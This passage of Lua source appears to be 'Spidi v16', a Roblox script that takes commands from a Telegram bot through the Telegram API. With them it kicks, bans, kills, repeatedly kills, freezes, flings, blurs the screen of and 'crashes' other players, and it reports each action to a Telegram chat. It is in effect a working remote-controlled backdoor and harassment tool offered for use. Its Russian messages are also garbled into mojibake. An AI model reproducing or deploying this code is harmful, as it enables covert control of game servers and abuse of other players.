        local reason = table.concat(args, " ", 2)
        if reason == "" or reason == name then target:Kick("Kicked by Spidi") else target:Kick(reason) end
        send("вњ… РљРёРєРЅСѓС‚: <b>"..target.Name.."</b>"..(reason ~= "" and reason ~= name and " (РџСЂРёС‡РёРЅР°: "..reason..")" or ""))
        return
    end
    
    if cmd == "ban" then
        local reason = table.concat(args, " ", 2)
        if reason == "" or reason == name then target:Kick("Banned by Spidi") else target:Kick(reason) end
        send("вњ… Р—Р°Р±Р°РЅРµРЅ: <b>"..target.Name.."</b>"..(reason ~= "" and reason ~= name and " (РџСЂРёС‡РёРЅР°: "..reason..")" or ""))
        return
    end
    
    if cmd == "unban" then
        target:Kick("Unbanned by Spidi")
        send("вњ… Р Р°Р·Р±Р°РЅРµРЅ: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "kill" and hum then
        hum.Health = 0
        send("рџ’Ђ РЈР±РёС‚: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "freeze" and hrp and hum then
        hrp.Anchored = true
        hum.WalkSpeed = 0
        hum.JumpPower = 0
        send("рџ§Љ Р—Р°РјРѕСЂРѕР¶РµРЅ: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "unfreeze" and hrp and hum then
        hrp.Anchored = false
        hum.WalkSpeed = 16
        hum.JumpPower = 50
        send("рџ”Ґ Р Р°Р·РјРѕСЂРѕР¶РµРЅ: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "fly" and hrp then
        local bv = Instance.new("BodyVelocity")
        bv.MaxForce = Vector3.new(1,1,1)*1e8
        bv.Velocity = Vector3.new(0,50,0)
        bv.Parent = hrp
        Debris:AddItem(bv,5)
        send("вњ€пёЏ РџРѕР»РµС‚РµР»: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "unfly" and hrp then
        for _, v in pairs(hrp:GetChildren()) do if v:IsA("BodyVelocity") then v:Destroy() end end
        send("рџ›‘ РћС‚РєР»СЋС‡РµРЅ РїРѕР»РµС‚: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "crash" and hrp then
        local pos = hrp.Position
        for i = 1, 100 do
            local p = Instance.new("Part")
            p.Size = Vector3.new(5,5,5)
            p.Position = pos + Vector3.new(math.random(-50,50), math.random(-50,50), math.random(-50,50))
            p.Anchored = true
            p.Parent = Workspace
            Debris:AddItem(p,2)
        end
        send("рџ’Ґ РљСЂР°С€РЅСѓС‚: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "fling" then
        fling(target)
        send("рџЊЂ Р¤Р»РёРЅРі РЅР° <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "loopkill" and hum then
        spawn(function()
            for i = 1, 10 do
                if not target or not target.Character then break end
                local h = target.Character:FindFirstChild("Humanoid")
                if h then h.Health = 0 end
                task.wait(0.5)
            end
        end)
        send("рџ”„ Loopkill РЅР° <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "stun" and hum then
        stun(target)
        send("вљЎ РћРіР»СѓС€РµРЅ РЅР° 3 СЃРµРє: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "jump" and hum then
        hum.Jump = true
        send("рџ¦ РџСЂС‹Р¶РѕРє: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "spin" then
        local speed = tonumber(args[2]) or 1
        speed = math.clamp(speed, 0.5, 10)
        if spin(target, speed) then
            send("рџ”„ Р’СЂР°С‰РµРЅРёРµ ("..speed.."x): <b>"..target.Name.."</b>")
        else
            send("вќЊ РќРµС‚ РїРµСЂСЃРѕРЅР°Р¶Р°")
        end
        return
    end
    
    if cmd == "unspin" then
        if unspin(target) then send("вњ… РћСЃС‚Р°РЅРѕРІР»РµРЅРѕ: <b>"..target.Name.."</b>") else send("вќЊ Р’СЂР°С‰РµРЅРёРµ РЅРµ Р°РєС‚РёРІРЅРѕ") end
        return
    end
    
    if cmd == "explode" and hrp then
        local pos = hrp.Position
        for i = 1, 30 do
            local p = Instance.new("Part")
            p.Size = Vector3.new(3,3,3)
            p.Position = pos + Vector3.new(math.random(-20,20), math.random(-20,20), math.random(-20,20))
            p.Anchored = true
            p.Material = Enum.Material.Neon
            p.BrickColor = BrickColor.new("Bright red")
            p.Parent = Workspace
            Debris:AddItem(p,1)
        end
        send("рџ’Ґ Р’Р·СЂС‹РІ: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "des" then
        desorient(target)
        send("рџЊЂ Р”РµР·РѕСЂРёРµРЅС‚Р°С†РёСЏ (3 СЃРµРє): <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "warp" then
        local level = tonumber(args[2]) or 5
        level = math.clamp(level, 1, 10)
        local blur = Lighting:FindFirstChild("SpidiWarp")
        if not blur then
            blur = Instance.new("BlurEffect")
            blur.Name = "SpidiWarp"
            blur.Parent = Lighting
        end
        blur.Size = level * 3
        send("рџЊЂ Р Р°Р·РјС‹С‚РёРµ "..level.."/10 РЅР° <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "unwarp" then
        local blur = Lighting:FindFirstChild("SpidiWarp")
        if blur then
            blur:Destroy()
            send("вњ… Р Р°Р·РјС‹С‚РёРµ СѓР±СЂР°РЅРѕ Сѓ <b>"..target.Name.."</b>")
        else
            send("вќЊ РќРµС‚ СЂР°Р·РјС‹С‚РёСЏ Сѓ <b>"..target.Name.."</b>")
        end
        return
    end
    
    send("вќЊ РќРµРёР·РІРµСЃС‚РЅР°СЏ РєРѕРјР°РЅРґР°. /help")
end

local oldPlayers = {}
local function checkNew()
    for _, p in pairs(Players:GetPlayers()) do
        if not oldPlayers[p.UserId] then
            if p:FindFirstChild("SpidiUser") then addUser(p) end
            oldPlayers[p.UserId] = true
        end
    end
end

spawn(function()
    while true do
        pcall(checkNew)
        wait(3)
    end
end)

local lastId = 0
local function poll()
    local url = "https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates?offset="..(lastId + 1)
    local r = req(url, "GET", {})
    if r and r.Body then
        local ok, d = pcall(HttpService.JSONDecode, HttpService, r.Body)
        if ok and d and d.result then
            for _, upd in pairs(d.result) do
                if upd.message and upd.message.text then
                    local msg = upd.message
                    if not CHAT_ID then
                        CHAT_ID = msg.chat.id
                        send("вњ… Spidi v16 Р·Р°РїСѓС‰РµРЅ!\nрџ‘¤ Hacker228")
                    end
                    local text = msg.text
                    if text:sub(1,1) == "/" then
                        local parts = {}
                        for w in string.gmatch(text, "%S+") do table.insert(parts, w) end
                        local cmd = parts[1]:sub(2):lower()
                        table.remove(parts, 1)
                        handle(cmd, parts)
                    end
                end
                if upd.update_id then lastId = upd.update_id end
            end
        end
    end
end

spawn(function()
    while true do
        pcall(poll)
        wait(2)
    end
end)

wait(3)
getChat()
if CHAT_ID then
    send("вњ… Spidi v16 Р·Р°РїСѓС‰РµРЅ!\nрџ‘¤ Hacker228\n/players - РїРѕР»СЊР·РѕРІР°С‚РµР»Рё\n/pc - РІСЃРµ РёРіСЂРѕРєРё\n/rm - РїРѕР»РЅС‹Р№ СЃР±СЂРѕСЃ")
end
